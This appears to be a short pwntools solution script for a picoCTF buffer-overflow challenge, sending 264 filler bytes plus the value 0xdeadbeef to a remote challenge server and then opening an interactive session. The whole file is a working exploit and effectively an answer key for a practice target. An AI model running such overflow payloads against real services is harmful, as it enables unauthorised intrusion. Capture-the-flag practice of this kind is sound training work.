from pwn import *

context.arch = 'amd64'
'''if args.REMOTE:
     conn = remote('billboard.challs.cyberchallenge.it', 9120)
else:'''
conn = remote('mars.picoctf.net', 31890)
     
conn.recvuntil(b'What do you see?')
payload = b'A' * 264       
payload += p32(3735928559)       
conn.sendline(payload)

conn.interactive()